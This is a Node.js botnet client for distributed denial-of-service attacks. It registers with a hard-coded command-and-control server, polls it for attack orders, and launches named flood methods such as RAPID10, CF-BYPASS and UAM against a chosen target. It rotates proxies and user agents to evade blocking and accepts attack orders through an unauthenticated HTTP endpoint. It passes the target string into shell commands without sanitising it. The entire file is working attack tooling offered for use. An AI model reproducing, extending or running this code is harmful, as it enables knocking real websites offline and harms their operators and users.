const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// ========== CONFIGURATION ==========
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://server-ku8h.onrender.com';
const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
const MAX_REGISTRATION_ATTEMPTS = 5;
const BOT_TIMEOUT = 30000;
const REPORT_INTERVAL = 60000; // 60 seconds

// ========== GLOBAL VARIABLES ==========
let myBotUrl = '';
let registrationAttempts = 0;
let activeProcesses = [];
let isBlocked = false;
let proxyList = [];
let uaList = [];
let currentProxyIndex = 0;
let currentUaIndex = 0;
let requestCount = 0;
let totalRequests = 0;
let currentAttack = null;
let attackStartTime = null;

// ========== COLORS FOR CONSOLE ==========
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  redBright: '\x1b[91m',
  greenBright: '\x1b[92m',
  yellowBright: '\x1b[93m',
  blueBright: '\x1b[94m',
  magentaBright: '\x1b[95m',
  cyanBright: '\x1b[96m'
};

function color(text, colorCode) {
  return `${colorCode}${text}${colors.reset}`;
}

// Auto-install missing dependencies
async function installDependencies() {
  const requiredPackages = [
    'express',
    'axios',
    'socks',
    'random-useragent',
    'cookie-parser',
    'express-rate-limit',
    'https-proxy-agent',
    'socks-proxy-agent',
    'colors'
  ];

  console.log(color('\n🔍 Checking dependencies...', colors.cyan));
  
  const missingPackages = [];
  
  for (const pkg of requiredPackages) {
    try {
      require.resolve(pkg);
      console.log(color(`✅ ${pkg} - installed`, colors.green));
    } catch (e) {
      console.log(color(`❌ ${pkg} - missing`, colors.red));
      missingPackages.push(pkg);
    }
  }

  if (missingPackages.length > 0) {
    console.log(color('\n📦 Installing missing packages: ' + missingPackages.join(', '), colors.yellow));
    
    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
        stdio: 'inherit',
        shell: true
      });

      install.on('close', (code) => {
        if (code === 0) {
          console.log(color('\n✅ All dependencies installed!\n', colors.green));
          resolve();
        } else {
          reject(new Error('Installation failed'));
        }
      });
    });
  }
  return Promise.resolve();
}

// Main bot function
async function startBot() {
  await installDependencies();

  // Now require packages
  const express = require('express');
  const axios = require('axios');
  const { SocksProxyAgent } = require('socks-proxy-agent');
  const { HttpsProxyAgent } = require('https-proxy-agent');
  const randomUseragent = require('random-useragent');
  const cookieParser = require('cookie-parser');
  require('colors');

  const app = express();
  app.use(express.json());
  app.use(cookieParser());

  // ========== PROXY MANAGEMENT ==========
  function loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        proxyList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#') && line.includes(':'));
        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
      } else {
        console.log(color('[PROXY] No proxy.txt found, creating template', colors.yellow));
        fs.writeFileSync('proxy.txt', '# Add your proxies here\n# Format: ip:port\n# Example: 192.168.1.1:8080\n');
      }
    } catch (error) {
      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
    }
  }

  // ========== USER AGENT MANAGEMENT ==========
  function loadUserAgents() {
    try {
      if (fs.existsSync('ua.txt')) {
        const data = fs.readFileSync('ua.txt', 'utf8');
        uaList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#'));
        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
      } else {
        console.log(color('[UA] No ua.txt found, creating template with default UAs', colors.yellow));
        const defaultUAs = [
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ];
        fs.writeFileSync('ua.txt', '# User Agents - one per line\n' + defaultUAs.join('\n'));
        uaList = defaultUAs;
      }
    } catch (error) {
      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
    }
  }

  function getNextProxy() {
    if (proxyList.length === 0) return null;
    const proxy = proxyList[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
    return proxy;
  }

  function getNextUserAgent() {
    if (uaList.length === 0) return randomUseragent.getRandom();
    const ua = uaList[currentUaIndex];
    currentUaIndex = (currentUaIndex + 1) % uaList.length;
    return ua;
  }

  function createProxyAgent(targetUrl) {
    const proxy = getNextProxy();
    if (!proxy) return null;

    try {
      if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
        return new SocksProxyAgent(proxy);
      } else {
        // Format: ip:port
        return new HttpsProxyAgent(`http://${proxy}`);
      }
    } catch (error) {
      return null;
    }
  }

  // ========== HTTPS AGENT FOR WINDOWS ==========
  const httpsAgent = new https.Agent({
    rejectUnauthorized: true,
    keepAlive: true,
    secureOptions: require('crypto').constants.SSL_OP_IGNORE_UNEXPECTED_EOF
  });

  // ========== AXIOS INSTANCE ==========
  const api = axios.create({
    timeout: 10000,
    httpsAgent,
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
  });

  // ========== GET PUBLIC IP ==========
  async function getPublicIP() {
    try {
      const response = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
      return response.data.ip;
    } catch (error) {
      console.log(color('[WARN] Could not get public IP, using local IP', colors.yellow));
      const { networkInterfaces } = require('os');
      const nets = networkInterfaces();
      for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
          if (net.family === 'IPv4' && !net.internal) {
            return net.address;
          }
        }
      }
      return '127.0.0.1';
    }
  }

  // ========== FETCH SERVER INFO ==========
  async function fetchData() {
    try {
      const publicIP = await getPublicIP();
      myBotUrl = `http://${publicIP}:${PORT}`;
      
      console.log(color('\n' + '='.repeat(50), colors.cyan));
      console.log(color('🤖 AUTO-REGISTER BOT CLIENT STARTED!', colors.cyanBright));
      console.log(color('='.repeat(50), colors.cyan));
      console.log(color(`📍 Local:    http://localhost:${PORT}`, colors.green));
      console.log(color(`📍 Network:  ${myBotUrl}`, colors.green));
      console.log(color(`🔗 Master:   ${MASTER_SERVER}`, colors.yellow));
      console.log(color(`🔄 Status:   Auto-registration ENABLED`, colors.magenta));
      console.log(color(`💓 Heartbeat: Every 30 seconds`, colors.blue));
      console.log(color(`📊 Reports:  Every 60 seconds`, colors.green));
      console.log(color(`🕸️  Proxies:   ${proxyList.length} loaded`, colors.cyan));
      console.log(color(`👤 User Agents: ${uaList.length} loaded`, colors.green));
      console.log(color('='.repeat(50), colors.cyan) + '\n');
      
      return publicIP;
    } catch (error) {
      myBotUrl = `http://localhost:${PORT}`;
      console.log(color(`🤖 Bot running at ${myBotUrl}`, colors.green));
      console.log(color(`🔗 Master Server: ${MASTER_SERVER}`, colors.yellow));
    }
  }

  // ========== AUTO REGISTER ==========
  async function autoRegister() {
    if (isBlocked) {
      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
      process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
      setTimeout(() => {
        registrationAttempts = 0;
        autoRegister();
      }, 60000);
      return;
    }

    try {
      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
      
      const payload = { 
        url: myBotUrl 
      };
      
      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));

      const response = await api.post(
        `${MASTER_SERVER}/register`,
        payload
      );

      console.log(color(`✅ Server response:`, colors.green));
      console.log(color(`   Status: ${response.status}`, colors.green));
      console.log(color(`   Data: ${JSON.stringify(response.data)}`, colors.cyan));

      if (response.data.approved) {
        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
        console.log(color(`🤖 Bot URL: ${myBotUrl}`, colors.cyan));
        console.log(color(`⚡ Ready for commands!\n`, colors.green));
        
        // Start polling for commands
        setInterval(() => {
          checkForCommands();
        }, 3000);
        
        // Send heartbeat
        setInterval(() => {
          sendHeartbeat();
        }, 30000);
        
        return;
      }
    } catch (error) {
      console.log(color(`❌ Registration failed:`, colors.red));
      
      if (error.response) {
        console.log(color(`   Status: ${error.response.status}`, colors.yellow));
        console.log(color(`   Data: ${JSON.stringify(error.response.data)}`, colors.red));
        console.log(color(`   Headers: ${JSON.stringify(error.response.headers)}`, colors.gray));
        
        if (error.response.status === 403) {
          console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
          isBlocked = true;
          process.exit(0);
        }
      } else if (error.request) {
        console.log(color(`   No response from server`, colors.yellow));
        console.log(color(`   Is the server running at ${MASTER_SERVER}?`, colors.yellow));
      } else {
        console.log(color(`   Error: ${error.message}`, colors.red));
      }
      
      registrationAttempts++;
      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
      
      setTimeout(() => {
        autoRegister();
      }, 5000);
    }
  }

  // ========== SEND HEARTBEAT ==========
  async function sendHeartbeat() {
    try {
      const response = await api.get(`${MASTER_SERVER}/ping`);
      console.log(color(`💓 Heartbeat | Status: ONLINE | Total Reqs: ${totalRequests}`, colors.green));
    } catch (error) {
      console.log(color(`💔 Heartbeat failed | Status: OFFLINE`, colors.red));
      registrationAttempts = 0;
      autoRegister();
    }
  }

  // ========== CHECK FOR COMMANDS ==========
  async function checkForCommands() {
    try {
      const response = await api.get(`${MASTER_SERVER}/get-command`, {
        params: { botUrl: myBotUrl }
      });

      if (response.data.hasCommand) {
        const command = response.data.command;
        
        if (command.action === 'stop') {
          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
          stopAllAttacks();
        } else if (command.action === 'attack') {
          const { target, time, methods } = command;
          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
          executeAttack(target, time, methods);
        }
      }
    } catch (error) {
      // Silently fail
    }
  }

  // ========== STOP ALL ATTACKS ==========
  function stopAllAttacks() {
    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
    activeProcesses.forEach(proc => {
      try {
        process.kill(-proc.pid);
      } catch (error) {}
    });
    activeProcesses = [];
    currentAttack = null;
    requestCount = 0;
    console.log(color(`✅ All attacks stopped`, colors.green));
  }

  // ========== EXECUTE ATTACK ==========
  function executeAttack(target, time, methods) {
    currentAttack = {
      id: Date.now(),
      target,
      methods,
      startTime: Date.now(),
      lastReportedCount: 0
    };
    requestCount = 0;
    attackStartTime = Date.now();

    const execWithLog = (cmd) => {
      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          console.error(color(`❌ Error: ${error.message}`, colors.red));
          return;
        }
        if (stdout) {
          const lines = stdout.split('\n');
          lines.forEach(line => {
            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
              requestCount++;
              totalRequests++;
            }
          });
          // Only log first few lines to avoid spam
          if (lines.length > 0 && lines[0].length > 0) {
            console.log(color(`📤 ${lines[0].substring(0, 100)}`, colors.gray));
          }
        }
        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
      });
      
      activeProcesses.push(proc);
      
      setTimeout(() => {
        const index = activeProcesses.indexOf(proc);
        if (index > -1) {
          try {
            process.kill(-proc.pid);
          } catch (e) {}
          activeProcesses.splice(index, 1);
        }
      }, parseInt(time) * 1000 + 5000);
    };

    // Attack methods - UPDATED WITH R10 SERIES connected to proxy.txt and ua.txt
    if (methods === 'RAPID10') {
      console.log(color(`🔥🔥 RAPID10: LAUNCHING ALL 10 VECTORS 🔥🔥`, colors.redBright));
      console.log(color(`Target: ${target} | Duration: ${time}s | Proxies: ${proxyList.length} | UAs: ${uaList.length}`, colors.yellow));
      
      // RAPID10 - ALL METHODS with proxy and UA support
      execWithLog(`node methods/r10-rapid.js ${target} ${time} 10000 proxy.txt ua.txt`);
      execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-header.js ${target} ${time} 5000 proxy.txt ua.txt`);
      execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 1000 proxy.txt ua.txt`);
      
      console.log(color(`✅ RAPID10: ALL 10 ATTACK VECTORS DEPLOYED`, colors.green));
    }
    else if (methods === 'R10-RAPID') {
      execWithLog(`node methods/r10-rapid.js ${target} ${time} 10000 proxy.txt ua.txt`);
    }
    else if (methods === 'R10-TCP') {
      execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-TLS') {
      execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-CONN') {
      execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-HEADER') {
      execWithLog(`node methods/r10-header.js ${target} ${time} 5000 proxy.txt ua.txt`);
    }
    else if (methods === 'R10-FRAG') {
      execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-PIPE') {
      execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-COOKIE') {
      execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-MIXED') {
      execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'R10-LOWCPU') {
      execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 1000 proxy.txt ua.txt`);
    }
    else if (methods === 'CF-BYPASS') {
      execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
    }
    else if (methods === 'MODERN-FLOOD') {
      execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
    }
    else if (methods === 'HTTP-SICARIO') {
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
    }
    else if (methods === 'RAW-HTTP') {
      execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    }
    else if (methods === 'R9') {
      execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
    }
    else if (methods === 'PRIV-TOR') {
      execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
    }
    else if (methods === 'HOLD-PANEL') {
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    }
    else if (methods === 'R1') {
      execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
    }
    else if (methods === 'UAM') {
      execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
    }
    else if (methods === 'W.I.L') {
      execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
    }
  }

  // ========== HEALTH ENDPOINT ==========
  app.get('/health', (req, res) => {
    res.json({
      status: 'online',
      uptime: process.uptime(),
      totalRequests,
      proxies: proxyList.length,
      userAgents: uaList.length,
      currentAttack: currentAttack ? {
        target: currentAttack.target,
        method: currentAttack.methods,
        duration: Math.floor((Date.now() - attackStartTime) / 1000),
        requests: requestCount
      } : null
    });
  });

  // ========== PING ENDPOINT ==========
  app.get('/ping', (req, res) => {
    res.json({ 
      alive: true,
      uptime: process.uptime(),
      timestamp: Date.now(),
      status: 'online',
      totalRequests,
      proxies: proxyList.length
    });
  });

  // ========== PROXY ENDPOINT ==========
  app.get('/proxies', (req, res) => {
    res.json({ 
      total: proxyList.length,
      proxies: proxyList.slice(0, 10)
    });
  });

  // ========== UA ENDPOINT ==========
  app.get('/useragents', (req, res) => {
    res.json({ 
      total: uaList.length,
      userAgents: uaList.slice(0, 10)
    });
  });

  // ========== ATTACK ENDPOINT ==========
  app.get('/attack', (req, res) => {
    const { target, time, methods } = req.query;
    if (!target || !time || !methods) {
      return res.status(400).json({ error: 'Missing parameters' });
    }
    console.log(color(`\n📥 RECEIVED: ${methods} → ${target} for ${time}s`, colors.magenta));
    res.json({ message: 'Attack received', target, time, methods });
    executeAttack(target, time, methods);
  });

  // ========== START SERVER ==========
  app.listen(PORT, async () => {
    loadProxies();
    loadUserAgents();
    await fetchData();
    
    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
    setTimeout(() => {
      autoRegister();
    }, 3000);
  });
}

// ========== START EVERYTHING ==========
startBot().catch(error => {
  console.error(color('Failed to start bot:', colors.red), error);
  process.exit(1);
});
